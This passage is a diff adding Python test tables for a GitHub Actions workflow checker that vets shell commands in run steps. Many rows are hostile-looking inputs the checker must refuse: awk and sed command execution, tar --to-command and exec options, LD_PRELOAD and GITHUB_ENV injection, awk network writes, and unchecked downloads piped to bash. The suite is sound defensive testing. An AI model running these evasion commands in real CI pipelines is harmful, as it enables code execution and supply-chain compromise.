+    "r8 S4: a plain matrix value passes": (_r7_steps("      - run: echo ${{ matrix.k }}\n", head=R8_MATRIX % "a, b"), None, 0, ""),
+    # --- S3: an output of a `uses:` step is never safe in run text; an output of a `run:` step is.
+    "r8 S3: a run step output passes": (_r7_steps("      - id: r\n        run: echo \"v=1\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.r.outputs.v }}\n"), None, 0, ""),
+    # --- S8: every command word of a `run:` is in the allow-list and meets the policy of its tool.
+    "r8 S8: pip is not listed": (_r8("pip install requests"), None, 1, "allow-list"),
+    "r8 S8: sudo pip is not listed": (_r8("sudo pip install requests"), None, 1, "allow-list"),
+    "r8 S8: timeout with a bad duration is refused": (_r8("timeout soon echo ok"), None, 1, "timeout"),
+    "r8 S8: timeout of a listed command passes": (_r8("timeout 30 echo ok"), None, 0, ""),
+    "r8 S8: xargs of an unlisted command is refused": (_r8("echo a | xargs -r npm"), None, 1, "allow-list"),
+    "r8 S8: a computed command word is refused": (_r8("X=cu", "${X}rl https://x.example/i"), None, 1, "computed"),
+    "r8 S8: a function that replaces a listed command is refused": (_r8("curl() { echo no; }", "curl https://x.example/i"), None, 1, "function"),
+    "r8 S8: a function the text defines and calls passes": (_r8("f() { echo hi; }", "f"), None, 0, ""),
+    "r8 S8: bash -c is refused": (_r8("bash -c 'echo ok'"), None, 1, "script file"),
+    "r8 S8: bash of a repository script passes": (_r8("bash scripts/x.sh --flag"), None, 0, ""),
+    "r8 S8: bash of a parent path is refused": (_r8("bash ../x.sh"), None, 1, "script file"),
+    "r8 S8: python3 -m is refused": (_r8("python3 -m http.server"), None, 1, "script file"),
+    "r8 S8: python3 of a script passes": (_r8("python3 -I scripts/x.py"), None, 0, ""),
+    "r8 S8: source of an absolute path is refused": (_r8("source /etc/x.sh"), None, 1, "script file"),
+    "r8 S8: git remote is not listed": (_r8("git remote prune o"), None, 1, ""),
+    "r8 S8: git with a global option is refused": (_r8("git -c core.sshCommand=x fetch origin"), None, 1, "global option"),
+    "r8 S8: git fetch of a URL is refused": (_r8("git fetch https://x.example/r.git"), None, 1, "URL"),
+    "r8 S8: git config of another key is refused": (_r8("git config core.sshCommand x"), None, 1, "user.name"),
+    "r8 S8: git config user.name passes": (_r8("git config user.name x"), None, 0, ""),
+    "r8 S8: git upload-pack option is refused": (_r8("git fetch --upload-pack=x origin"), None, 1, "runs a program"),
+    "r8 S8: git fetch of a remote name passes": (_r8("git fetch --no-tags origin main"), None, 0, ""),
+    "r8 S8: cargo run is not listed": (_r8("cargo run"), None, 1, "RUN_CARGO"),
+    "r8 S8: cargo --config is refused": (_r8("cargo --config x build"), None, 1, "--config"),
+    "r8 S8: cargo install of another crate is refused": (_r8("cargo install evil --locked --version 1.0.0"), None, 1, "cargo install"),
+    "r8 S8: cargo install without a pinned version is refused": (_r8("cargo install cbindgen --locked"), None, 1, "cargo install"),
+    "r8 S8: cargo install of a listed crate passes": (_r8("cargo install --locked cbindgen --version 0.29.4"), None, 0, ""),
+    "r8 S8: cargo build passes": (_r8("cargo build --release --features sal"), None, 0, ""),
+    "r8 S8: gh release is refused": (_r8("gh release view v1"), None, 1, "gh"),
+    "r8 S8: gh api of a listed read-only endpoint passes": (_r8("gh api repos/o/r/pulls/1/reviews --paginate"), None, 0, ""),
+    "r8 S8: openssl s_client is refused": (_r8("openssl s_client -connect x.example:443"), None, 1, "RUN_OPENSSL"),
+    "r8 S8: openssl rand passes": (_r8("openssl rand -hex 8"), None, 0, ""),
+    "r8 S8: pipx install of another package is refused": (_r8("pipx install evil"), None, 1, "RUN_PIPX"),
+    "r8 S8: pipx install of copr-cli passes": (_r8("pipx install copr-cli"), None, 0, ""),
+    "r8 S8: apt-get install of another package is refused": (_r8("sudo apt-get install -y evil"), None, 1, "apt-get"),
+    "r8 S8: apt-get install of a listed package passes": (_r8("sudo apt-get install -y pipx rpm"), None, 0, ""),
+    "r8 S8: awk system call is refused": (_r8("awk 'BEGIN{system(\"id\")}'"), None, 1, "awk"),
+    "r8 S8: awk print passes": (_r8("echo a | awk '{print $1}'"), None, 0, ""),
+    "r8 S8: sed execute flag is refused": (_r8("echo a | sed 's/a/id/e'"), None, 1, "sed"),
+    "r8 S8: sed substitution passes": (_r8("echo a | sed 's/a/b/'"), None, 0, ""),
+    "r8 S8: a listed tool given a URL is refused": (_r8("rpm -i https://x.example/p.rpm"), None, 1, "URL argument"),
+    "r8 S8: a whole run from a secret passes": (_r5_job(steps="    steps:\n      - run: ${{ secrets.CMD }}\n"), None, 0, ""),
+    "r8 S8: a whole run from a matrix value is refused": (_r7_steps("      - run: ${{ matrix.k }}\n", head=R8_MATRIX % "'echo ok'"), None, 1, "computed"),
+    # --- C3 / C4 / C5: attached python module, docker forms, gh.
+    "r8 C3: python3 with an attached module is refused": (_r8("python3 -murllib.request https://x.example/f"), None, 1, "script file"),
+    "r8 C4: docker container run is refused": (_r8("docker container run --rm alpine:3 id"), None, 1, "RUN_DOCKER"),
+    "r8 C4: docker image pull is refused": (_r8("docker image pull alpine:3"), None, 1, "RUN_DOCKER"),
+    "r8 C4: a docker global option is refused": (_r8("docker --context x run --rm alpine:3 id"), None, 1, "global option"),
+    "r8 C4: an unknown docker run option is refused": (_r8("docker run --log-opt a alpine:3 id"), None, 1, "option"),
+    "r8 C4: docker run of a digest image with listed options passes": (_r8("docker run --rm -d --name n alpine@" + R5_DIGEST), None, 0, ""),
+    "r8 C4: docker logs passes": (_r8("docker logs n"), None, 0, ""),
+    # --- S1 / S2 / S7: the checksum check is per downloaded file, names the exact file and takes its digest from text.
+    "r8 S1: a second download unpacked without its own check is refused": (_r8(R7_FETCH, R7_VERIFY, "curl -fsSL -o g https://x.example/g", "tar xzf g"), None, 1, "own checksum"),
+    "r8 S1: two downloads each checked pass": (
+        _r8(R7_FETCH, R7_VERIFY, "curl -fsSL -o g https://x.example/g", 'echo "${SUM}  g" | sha256sum -c -', "tar xzf g"), None, 0, ""),
+    "r8 S1: a re-download discards the earlier check": (_r8(R7_FETCH, R7_VERIFY, R7_FETCH, "tar xzf f"), None, 1, "own checksum"),
+    "r8 S1: a checked file moved keeps its check": (_r8(R7_FETCH, R7_VERIFY, "mv f g", "tar xzf g"), None, 0, ""),
+    "r8 S1: an unchecked file moved stays unchecked": (_r8(R7_FETCH, "mv f g", "tar xzf g"), None, 1, "own checksum"),
+    "r8 S1: a verify chained with && covers the next command": (_r8(R7_FETCH, R7_VERIFY + " && tar xzf f"), None, 0, ""),
+    "r8 S1: a curl inside a command substitution is refused": (_r8("x=$(curl -fsSL https://x.example/i)"), None, 1, "command substitution"),
+    "r8 S7: a checklist file the step downloaded does not count": (
+        _r8(R7_FETCH, "curl -fsSL -o f.sha256 https://x.example/f.sha256", "sha256sum -c f.sha256", "tar xzf f"), None, 1, "checksum"),
+    "r8 S7: a checklist from the repository counts": (_r8(R7_FETCH, "sha256sum -c deploy/f.sha256", "tar xzf f"), None, 0, ""),
+    "r8 S7: a digest echoed from a command substitution does not count": (
+        _r8(R7_FETCH, 'echo "$(cat f.sum)  f" | sha256sum -c -', "tar xzf f"), None, 1, "cat"),
+    "r8 S7: a checklist piped through another command does not count": (
+        _r8(R7_FETCH, 'echo "${SUM}  f" | ls | sha256sum -c -', "tar xzf f"), None, 1, "own checksum"),
+    "r8 S7: a digest echoed through an inner echo substitution does not count": (
+        _r8(R7_FETCH, 'echo "$(echo abc)  f" | sha256sum -c -', "tar xzf f"), None, 1, "own checksum"),
+    "r8 S1: a verify two commands before the consumer does not chain": (
+        _r8(R7_FETCH, R7_VERIFY + " && echo ok && tar xzf f"), None, 1, "own checksum"),
+    "r8 S2: a later step naming a .sha256 file whose base was not fetched is refused": (
+        _r7_steps("      - run: curl -fsSL -o f.sha256 https://x.example/f.sha256\n", "      - run: cat f.sha256\n"), None, 1, "f.sha256"),
+    "r8 S8: a script path with a dot-dot component is refused": (_r8("bash scripts/../x.sh"), None, 1, "not a script file"),
+    "r8 S2: a later step that names the wget default file is refused": (_r7_steps("      - run: wget -q https://x.example/tool\n", "      - run: chmod +x tool\n"), None, 1, "tool"),
+    "r8 S2: a wget with -O records the named file": (_r7_steps("      - run: wget -q -O out https://x.example/tool\n", "      - run: chmod +x tool\n"), None, 0, ""),
+    "r8 S2: a later step that names the file by a glob is refused": (_r7_steps(R8_TOOL, "      - run: chmod +x too?\n"), None, 1, "tool"),
+    "r8 S2: a later sha256sum --version does not cover the file": (_r7_steps(R8_TOOL, "      - run: |\n          sha256sum --version\n          chmod +x tool\n"), None, 1, "checksum"),
+    "r8 S2: a later step that checks the exact file passes": (
+        _r7_steps(R8_TOOL, "      - run: |\n          echo \"${SUM}  tool\" | sha256sum -c -\n          chmod +x tool\n"), None, 0, ""),
+    "r8 S2: a later step cannot be read is refused": (_r7_steps(R8_TOOL, "      - run: |\n          chmod +x tool\n          echo )\n"), None, 1, "cannot read"),
+    "r8 S2: the weak companion pattern of a .sha256 pair is refused (Round 9, F5: a print-only sha256sum verifies nothing)": (
+        _r7_steps("      - run: |\n          curl -fsSL -o a https://x.example/a\n          curl -fsSL -o a.sha256 https://x.example/a.sha256\n",
+                  "      - run: |\n          ACTUAL=$(sha256sum a | cut -d' ' -f1)\n          test \"$ACTUAL\" = \"$(awk '{print $1}' a.sha256)\"\n"), None, 1, "checksum"),
+    # --- C2: a verify inside a function body never runs until called.
+    "r8 C2: a verify in an uncalled function does not count": (_r8(R7_FETCH, "g() { " + R7_VERIFY + "; }", "tar xzf f"), None, 1, "checksum"),
+    "r8 C2: a verify in a brace group counts": (_r8(R7_FETCH, "{ " + R7_VERIFY + "; }", "tar xzf f"), None, 0, ""),
+}
+
+
+# Round 9 (code r8 F1-F10): (document, files, message count, needle). Each row of F1-F6, F10 and the gh/git forms of F4 is a probe
+# of the reviewer (probe_r8.py R-rows, probe_r8b.py B-rows) or the same class with another delimiter, option or shape.
+R9_HEX = "0123456789abcdef" * 4
+R9_GH_REVIEWS = "repos/o/r/pulls/1/reviews"
+R9_SEQ = "    strategy:\n      matrix:\n        k:\n%s"
+
+R9_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
+    # --- F1: an awk program is read, not matched: no pipe, no getline, no system(), a print redirect only to a literal path.
+    "r9 F1: awk print to a pipe held in a variable is refused": (_r8("awk 'BEGIN { c = \"id\"; print 1 | c }'"), None, 1, "awk"),
+    "r9 F1: awk getline from a command is refused": (_r8("awk 'BEGIN { c = \"id\"; c | getline x }'"), None, 1, "awk"),
+    "r9 F1: awk getline from a file is refused": (_r8("awk 'BEGIN { getline x < \"f\" }'"), None, 1, "awk"),
+    "r9 F1: awk print to a pipe with a quoted command is refused": (_r8("awk '{ print $1 | \"sh\" }'"), None, 1, "awk"),
+    "r9 F1: awk printf to a pipe is refused": (_r8("awk '{ printf \"%s\", $1 | c }'"), None, 1, "awk"),
+    "r9 F1: awk print redirected to a variable path is refused": (_r8("awk '{ print $1 > f }' x"), None, 1, "awk"),
+    "r9 F1: awk print appended to a variable path is refused": (_r8("awk '{ print $1 >> f }' x"), None, 1, "awk"),
+    "r9 F1: awk print redirected to a literal path passes": (_r8("awk '{ print $1 > \"out.txt\" }' x"), None, 0, ""),
+    "r9 F1: awk print appended to a literal path passes": (_r8("awk '{ print $1 >> \"out.txt\" }' x"), None, 0, ""),
+    "r9 F1: awk print redirected to a concatenated path is refused": (_r8("awk '{ print $1 > \"o\" f }' x"), None, 1, "awk"),
+    "r9 F1: awk comparison inside parentheses passes": (_r8("awk '{ print ($1 > 2) }' x"), None, 0, ""),
+    "r9 F1: awk logical or and a quoted bar pass": (_r8("awk 'NR == 1 || NR == 2 { print \"a|b\" }' x"), None, 0, ""),
+    "r9 F1: awk with -F and -v passes": (_r8("awk -F= -v k=1 '{ print $2 }' x"), None, 0, ""),
+    "r9 F1: awk program held in a variable is refused": (_r8("P='{ print 1 }'", "awk \"$P\" x"), None, 1, "awk"),
+    "r9 F1: awk program held in an unquoted variable is refused": (_r8("P='{ print 1 }'", "awk $P x"), None, 1, "awk"),
+    "r9 F1: awk program in double quotes with an expansion is refused": (_r8("awk \"{ print \\$1 > \\\"$F\\\" }\" x"), None, 1, "awk"),
+    "r9 F1: awk -f program file is refused": (_r8("awk -f ci/x.awk x"), None, 1, "awk"),
+    "r9 F1: awk --file program file is refused": (_r8("awk --file=ci/x.awk x"), None, 1, "awk"),
+    "r9 F1: awk @load is refused": (_r8("awk '@load \"x\" BEGIN { }'"), None, 1, "awk"),
+    "r9 F1: awk with an unterminated string is refused": (_r8("awk '{ print \"a }' x"), None, 1, "awk"),
+    "r9 F1: awk system with a space is refused": (_r8("awk 'BEGIN { system (\"id\") }'"), None, 1, "awk"),
+    # --- F2: a sed script is parsed: the e command and the e flag with any delimiter, program files, w and r to a computed path.
+    "r9 F2: sed address and e command is refused": (_r8("sed -n '1e id' README.md"), None, 1, "sed"),
+    "r9 F2: sed last-line address and e command is refused": (_r8("sed '$e id' README.md"), None, 1, "sed"),
+    "r9 F2: sed regex address and e command is refused": (_r8("sed '/x/e id' README.md"), None, 1, "sed"),
+    "r9 F2: sed range address and e command is refused": (_r8("sed '1,3e id' README.md"), None, 1, "sed"),
+    "r9 F2: sed custom regex delimiter address and e command is refused": (_r8("sed '\\,x,e id' README.md"), None, 1, "sed"),
+    "r9 F2: sed e command after a semicolon is refused": (_r8("sed 's/a/b/;e id' README.md"), None, 1, "sed"),
+    "r9 F2: sed e command inside a block is refused": (_r8("sed -n -e '1{e id' -e '}' README.md"), None, 1, "sed"),
+    "r9 F2: sed e flag with a bar delimiter is refused": (_r8("echo x | sed 's|x|id|e'"), None, 1, "sed"),
+    "r9 F2: sed e flag with a hash delimiter and other flags is refused": (_r8("echo x | sed 's#x#id#ge'"), None, 1, "sed"),
+    "r9 F2: sed e flag with a comma delimiter is refused": (_r8("echo x | sed 's,x,id,e'"), None, 1, "sed"),
+    "r9 F2: sed w flag path is not a flag": (_r8("echo x | sed 's/x/y/w out.txt'"), None, 0, ""),
+    "r9 F2: sed -f program file is refused": (_r8("sed -f ci/x.sed README.md"), None, 1, "sed"),
+    "r9 F2: sed -n -f program file is refused": (_r8("sed -n -f ci/x.sed README.md"), None, 1, "sed"),
+    "r9 F2: sed --file program file is refused": (_r8("sed --file=ci/x.sed README.md"), None, 1, "sed"),
+    "r9 F2: sed -s is refused": (_r8("sed -s -n p a b"), None, 1, "sed"),
+    "r9 F2: sed w to a literal path passes": (_r8("sed -n 'w out.txt' README.md"), None, 0, ""),
+    "r9 F2: sed w to a computed path is refused": (_r8("sed -n \"w $OUT\" README.md"), None, 1, "sed"),
+    "r9 F2: sed r of a computed path is refused": (_r8("sed \"r $IN\" README.md"), None, 1, "sed"),
+    "r9 F2: sed flag from an expansion is refused": (_r8("sed \"s/a/b/$F\" README.md"), None, 1, "sed"),
+    "r9 F2: sed command from an expansion is refused": (_r8("sed \"$CMD\" README.md"), None, 1, "sed"),
+    "r9 F2: sed with an unknown option is refused": (_r8("sed --debug-x p README.md"), None, 1, "sed"),
+    "r9 F2: sed in-place with a replacement variable passes": (_r8("sed -i \"s/X/${V}/\" README.md"), None, 0, ""),
+    "r9 F2: sed two -e scripts with a replacement variable pass": (
+        _r8("sed -e \"s/^Version:.*/Version:  ${V}/\" -e 's/a/b/' README.md"), None, 0, ""),
+    "r9 F2: sed substitutions, ranges, blocks and y pass": (
+        _r8("sed -n -e 's/a/b/g;s/c/d/' -e '/a/,/b/p' -e '2{p;q}' -e '$d' -e 'y/abc/xyz/' README.md"), None, 0, ""),
+    "r9 F2: sed -E with an alternation passes": (_r8("sed -E 's/(a)|b/\\1/g' README.md"), None, 0, ""),
+    "r9 F2: sed append text that contains an e passes": (_r8("sed '1a echo e' README.md"), None, 0, ""),
+    # --- F3: tar program options are refused in every run, not only in a fetch step.
+    "r9 F3: tar --to-command outside a fetch step is refused": (_r8("tar xf vendor.tar --to-command=id"), None, 1, "tar"),
+    "r9 F3: tar -I outside a fetch step is refused": (_r8("tar -I ./x -xf vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar -I in a bundled cluster is refused": (_r8("tar -xIf ./x vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar old-style cluster with I is refused": (_r8("tar xIf ./x vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar --use-compress-program is refused": (_r8("tar --use-compress-program=./x -xf vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar --checkpoint-action=exec is refused": (_r8("tar --checkpoint=1 --checkpoint-action=exec=id -cf o.tar ."), None, 1, "tar"),
+    "r9 F3: tar --rsh-command is refused": (_r8("tar --rsh-command=./x -xf h:vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar --rmt-command is refused": (_r8("tar --rmt-command=./x -xf h:vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar --info-script is refused": (_r8("tar --info-script=./x -xf vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar --new-volume-script is refused": (_r8("tar --new-volume-script=./x -xf vendor.tar"), None, 1, "tar"),
+    "r9 F3: tar abbreviated --to-c is refused": (_r8("tar xf vendor.tar --to-c=id"), None, 1, "tar"),
+    "r9 F3: tar --strip-components extract passes": (_r8("tar --strip-components=1 -xzf vendor.tgz -C out"), None, 0, ""),
+    "r9 F3: tar xzf passes": (_r8("tar xzf vendor.tgz"), None, 0, ""),
+    # --- F4: gh api only on a listed read-only endpoint, never into a shell; a captured API or git show body is a download.
+    "r9 F4: gh api raw content to a file then bash is refused": (
+        _r8("gh api -H 'Accept: application/vnd.github.raw' repos/o/r/contents/i.sh > i.sh", "bash i.sh"), None, 1, "bash"),
+    "r9 F4: gh api tarball then tar and source is refused": (
+        _r8("gh api repos/o/r/tarball/v1 > f.tgz", "tar xzf f.tgz", "source f/i.sh"), None, 1, "f.tgz"),
+    "r9 F4: gh api to a file in one step, bash in the next is refused": (
+        _r7_steps("      - run: |\n          gh api -H 'Accept: application/vnd.github.raw' repos/o/r/contents/i.sh > i.sh\n",
+                  "      - run: bash i.sh\n"), None, 2, "i.sh"),
+    "r9 F4: gh api of an unlisted endpoint is refused": (_r8("gh api repos/o/r"), None, 1, "gh api"),
+    "r9 F4: gh api with --input is refused": (_r8(f"gh api {R9_GH_REVIEWS} --input x.json"), None, 1, "gh api"),
+    "r9 F4: gh api with -X is refused": (_r8(f"gh api -X POST {R9_GH_REVIEWS}"), None, 1, "gh api"),
+    "r9 F4: gh api with --output is refused": (_r8(f"gh api {R9_GH_REVIEWS} --output r.json"), None, 1, "gh api"),
+    "r9 F4: gh api of a listed endpoint into a command substitution passes": (
+        _r8(f"approved=$(gh api \"{R9_GH_REVIEWS}\" --paginate --jq '.[]')"), None, 0, ""),
+    "r9 F4: gh api of a listed endpoint with variables passes": (
+        _r8("approved=$(gh api \"repos/$REPO/pulls/$PR_NUMBER/reviews\" --paginate --jq \"[.[] | select(.user.login == \\\"$L\\\")] | length\")"), None, 0, ""),
+    "r9 F4: gh api of a listed endpoint into bash is refused": (_r8(f"gh api {R9_GH_REVIEWS} | bash"), None, 1, "gh api"),
+    "r9 F4: gh api of a listed endpoint into python3 is refused": (_r8(f"gh api {R9_GH_REVIEWS} | python3 -"), None, 1, "gh api"),
+    "r9 F4: gh api of a listed endpoint into tee is refused": (_r8(f"gh api {R9_GH_REVIEWS} | tee r.json"), None, 1, "tee"),
+    "r9 F4: gh api of a listed endpoint to a file is a download that is named by the next step": (
+        _r7_steps(f"      - run: gh api {R9_GH_REVIEWS} > r.json\n", "      - run: cat r.json\n"), None, 1, "r.json"),
+    "r9 F4: gh api of a listed endpoint to a file, then a non-fetch command in the same step is refused": (
+        _r8(f"gh api {R9_GH_REVIEWS} > r.json", "cat r.json"), None, 1, "fetch step"),
+    "r9 F4: git show of another ref to a file then bash is refused": (_r8("git show origin/x:i.sh > i.sh", "bash i.sh"), None, 1, "fetch step"),
+    "r9 F4: git show of another ref to a file, named by the next step, is refused": (
+        _r7_steps("      - run: git show origin/x:i.sh > i.sh\n", "      - run: bash i.sh\n"), None, 1, "i.sh"),
+    "r9 F4: git show of a ref and path into a substitution is refused": (_r8("x=$(git show origin/x:i.sh)"), None, 1, "git show"),
+    "r9 F4: git show without a path passes": (_r8("git show --stat HEAD"), None, 0, ""),
+    "r9 F4: git show of a ref and path that prints passes": (_r8("git show HEAD:README.md"), None, 0, ""),
+    "r9 F4: gh release download is refused": (_r8("gh release download v1 -p i.sh"), None, 1, "gh"),
+    "r9 F4: gh run download is refused": (_r8("gh run download 1 -n a"), None, 1, "gh"),
+    # --- F5: a name is verified by a check-mode call fed a literal pair or a repository checklist, or a literal digest comparison.
+    "r9 F5: a later step whose sha256sum only prints a digest is refused": (
+        _r7_steps("      - run: curl -fsSL -o i.sh https://x.example/i.sh\n", "      - run: |\n          sha256sum i.sh\n          bash i.sh\n"), None, 1, "checksum"),
+    "r9 F5: a later step whose shasum only prints a digest is refused": (
+        _r7_steps("      - run: curl -fsSL -o t.py https://x.example/t.py\n", "      - run: |\n          shasum -a 256 t.py\n          python3 t.py\n"), None, 1, "checksum"),
+    "r9 F5: a later step whose sha256sum -c names the file passes": (
+        _r7_steps("      - run: curl -fsSL -o i.sh https://x.example/i.sh\n",
+                  f"      - run: |\n          sha256sum -c <<< \"{R9_HEX}  i.sh\"\n          bash i.sh\n"), None, 0, ""),
+    "r9 F5: a later step whose literal digest comparison names the file passes": (
+        _r7_steps("      - run: curl -fsSL -o i.sh https://x.example/i.sh\n",
+                  f"      - run: |\n          h=$(sha256sum i.sh)\n          [ \"${{h%% *}}\" = \"{R9_HEX}\" ]\n          bash i.sh\n"), None, 0, ""),
+    "r9 F5: a check-mode call fed a literal pair verifies": (_r8(R7_FETCH, f"sha256sum -c <<< \"{R9_HEX}  f\"", "tar xzf f"), None, 0, ""),
+    "r9 F5: a check-mode call fed a pair that names another file does not verify": (
+        _r8(R7_FETCH, f"sha256sum -c <<< \"{R9_HEX}  g\"", "tar xzf f"), None, 1, "own checksum"),
+    "r9 F5: a print-only digest then tar is refused": (_r8(R7_FETCH, "sha256sum f", "tar xzf f"), None, 1, "own checksum"),
+    "r9 F5: a digest compared with a literal 64-hex verifies": (
+        _r8(R7_FETCH, "h=$(sha256sum f)", f"[ \"${{h%% *}}\" = \"{R9_HEX}\" ]", "tar xzf f"), None, 0, ""),
+    "r9 F5: a double bracket test in a fetch step is refused (use `[`)": (
+        _r8(R7_FETCH, "[[ \"$(sha256sum f)\" == " + R9_HEX + " ]]", "tar xzf f"), None, 1, "[["),
+    "r9 F5: a digest compared with a variable is refused": (
+        _r8(R7_FETCH, "h=$(sha256sum f)", "[ \"${h%% *}\" = \"$WANT\" ]", "tar xzf f"), None, 1, "own checksum"),
+    "r9 F5: a digest compared with a short literal is refused": (
+        _r8(R7_FETCH, "h=$(sha256sum f)", "[ \"${h%% *}\" = abcdef ]", "tar xzf f"), None, 1, "own checksum"),
+    "r9 F5: a literal digest comparison that a || true defuses is refused": (
+        _r8(R7_FETCH, "h=$(sha256sum f)", f"[ \"${{h%% *}}\" = \"{R9_HEX}\" ] || true", "tar xzf f"), None, 1, "own checksum"),
+    "r9 F5: a literal digest comparison inside a condition is refused": (
+        _r8(R7_FETCH, "h=$(sha256sum f)", f"if [ \"${{h%% *}}\" = \"{R9_HEX}\" ]; then echo ok; fi", "tar xzf f"), None, 1, "own checksum"),
+    # --- F6: the expected digest is a literal 64-hex or comes from a verified file; a variable the job assigns is a self-made digest.
+    "r9 F6: a digest computed from the file and fed back through a variable is refused": (
+        _r8(R7_FETCH, "h=$(sha256sum < f)", "echo \"${h%% *}  f\" | sha256sum -c -", "tar xzf f"), None, 1, "own checksum"),
+    "r9 F6: a digest computed by an exported variable is refused": (
+        _r8(R7_FETCH, "export H=$(sha256sum f)", "echo \"${H%% *}  f\" | sha256sum -c -", "tar xzf f"), None, 1, "export"),
+    "r9 F6: a digest read into a variable is refused": (
+        _r8(R7_FETCH, "read -r H < <(sha256sum f)", "echo \"${H%% *}  f\" | sha256sum -c -", "tar xzf f"), None, 1, "read"),
+    "r9 F6: a digest set by printf -v is refused": (
+        _r8(R7_FETCH, "printf -v H '%s' \"$(sha256sum f)\"", "echo \"${H%% *}  f\" | sha256sum -c -", "tar xzf f"), None, 1, "printf"),
+    "r9 F6: a digest in a variable the job sets to a literal 64-hex passes": (
+        _r8(R7_FETCH, f"H={R9_HEX}", "echo \"${H}  f\" | sha256sum -c -", "tar xzf f"), None, 0, ""),
+    "r9 F6: a digest in a variable the job sets to a short literal is refused": (
+        _r8(R7_FETCH, "H=abc", "echo \"${H}  f\" | sha256sum -c -", "tar xzf f"), None, 1, "own checksum"),
+    "r9 F6: a digest in a variable set from a file is refused": (
+        _r8(R7_FETCH, "H=$(cat deploy/f.sum)", "echo \"${H}  f\" | sha256sum -c -", "tar xzf f"), None, 1, "cat"),
+    "r9 F6: a digest in an unassigned variable passes": (_r8(R7_FETCH, R7_VERIFY, "tar xzf f"), None, 0, ""),
+    "r9 F6: a digest in a variable a case arm sets to a literal 64-hex passes": (
+        _r8(R7_FETCH, f"case \"$A\" in x) H={R9_HEX} ;; *) H={R9_HEX[::-1]} ;; esac", "echo \"${H}  f\" | sha256sum -c -", "tar xzf f"), None, 0, ""),
+    # --- F7: a quoted literal repository script path is a literal path.
+    "r9 F7: bash of a double-quoted literal script passes": (_r8('bash "ci/x.sh"'), None, 0, ""),
+    "r9 F7: bash of a single-quoted literal script passes": (_r8("bash 'ci/x.sh'"), None, 0, ""),
+    "r9 F7: python3 of a quoted literal script passes": (_r8('python3 -I "scripts/x.py"'), None, 0, ""),
+    "r9 F7: source of a quoted literal script passes": (_r8('source "ci/x.sh"'), None, 0, ""),
+    "r9 F7: bash of a quoted variable is refused": (_r8('bash "$X"'), None, 1, "script file"),
+    "r9 F7: bash of a quoted path with a variable is refused": (_r8('bash "ci/$X.sh"'), None, 1, "script file"),
+    "r9 F7: bash of an unquoted path with a variable is refused": (_r8("bash ci/${X}.sh"), None, 1, "script file"),
+    "r9 F7: bash of a quoted parent path is refused": (_r8('bash "../x.sh"'), None, 1, "script file"),
+    "r9 F7: bash of a quoted absolute path is refused": (_r8('bash "/etc/x.sh"'), None, 1, "script file"),
+    "r9 F7: bash of a command substitution is refused": (_r8('bash "$(pick)"'), None, 1, "without a literal script file"),
+    'r9 F6/sec F1: a fetch step that opens with an assignment to LD_PRELOAD is refused as a fetch step': (_r8("LD_PRELOAD=./x.so curl -fsSL -o a.tgz https://h.test/a.tgz"), None, 1, 'is a fetch step that runs an assignment'),
+    'r9 F6/sec F1: a fetch step that sets LD_PRELOAD after the download is refused as a fetch step': (_r8("curl -fsSL -o a.tgz https://h.test/a.tgz", "LD_PRELOAD=./x.so true"), None, 1, 'is a fetch step that runs an assignment'),
+    'r9 sec F1: a fetch step that writes GITHUB_ENV is refused as a fetch step': (_r8("curl -fsSL -o a.tgz https://h.test/a.tgz", "echo A=1 >> $GITHUB_ENV"), None, 1, 'a write to GITHUB_ENV or GITHUB_PATH'),
+    'r9 F4: gh release list is neither gh api nor gh attestation verify': (_r8("gh release list"), None, 1, 'neither `gh api`'),
+    'r9 F2: sed with a bare e command is refused': (_r8("sed e in.txt"), None, 1, '`e` command'),
+    'r9 F2: sed with an addressed e command is refused': (_r8("sed '1e' in.txt"), None, 1, '`e` command'),
+    'r9 F1: awk print to a path that is not a literal string is refused': (_r8("awk '{print > $1\";}' in.txt"), None, 1, 'not a literal string'),
+    'r9 F1: awk print to a variable path is refused': (_r8("awk '{print > f\";}' in.txt"), None, 1, 'not a literal string'),
+    'r9 F1: awk print to a network special file is refused': (_r8("awk '{print > \"/inet/tcp/0/h/80\"}' in.txt"), None, 1, 'network special file'),
+    'r9 F2: sed s///w to an expanded path is refused': (_r8('sed "s/a/b/w $OUT" in.txt'), None, 1, '`w` flag'),
+    'r9 F2: sed address from an expansion is refused': (_r8('sed -n "${N}p" in.txt'), None, 1, 'address'),
+    'r9 F2: sed with a command the guard does not read is refused': (_r8("sed 'k' in.txt"), None, 1, 'does not read'),
+    'r9 F2: sed with text where a command ends is refused': (_r8("sed 'pq' in.txt"), None, 1, 'where a command ends'),
+    'r9 F4: gh api with -X is refused by name': (_r8("gh api -X DELETE " + R9_GH_REVIEWS), None, 1, 'with `-X`'),
+    'r9 F5: a later step whose sha256sum is fed a pair but not in check mode verifies nothing': (_r7_steps("      - run: curl -fsSL -o i.sh https://x.example/i.sh\n", "      - run: |\n          echo \"abc  i.sh\" | sha256sum\n          bash i.sh\n"), None, 1, 'checksum'),
+    'r9 F5: a later step whose shasum reads a here-string pair but not in check mode verifies nothing': (_r7_steps("      - run: curl -fsSL -o i.sh https://x.example/i.sh\n", "      - run: |\n          shasum -a 256 <<< \"abc  i.sh\"\n          bash i.sh\n"), None, 1, 'checksum'),
+    'r9 F4: a gh release download to a named file, then tar of it, is refused by name': (_r8("gh release download v1 -p f.tgz -O f.tgz", "tar xzf f.tgz"), None, 1, 'f.tgz'),
+    'r9 sec F1: a here-document written to GITHUB_ENV is refused': (_r7_steps("      - run: |\n          cat >> $GITHUB_ENV <<EOF\n          A=1\n          EOF\n"), None, 1, 'here-document'),
+    'r9 sec F1: a here-document written to a quoted GITHUB_ENV is refused': (_r7_steps("      - run: |\n          cat <<EOF >> \"$GITHUB_ENV\"\n          A=1\n          EOF\n"), None, 1, 'here-document'),
+    'r9 sec F1: a printf format holding two variable assignments for GITHUB_ENV is refused': (_r8("printf 'A=1\\nB=2\\n' >> $GITHUB_ENV"), None, 1, 'computed'),
+    # --- F8: a mapping or a sequence matrix value spliced whole into run text is a problem.
+    "r9 F8: a mapping-valued matrix key spliced into run is refused": (
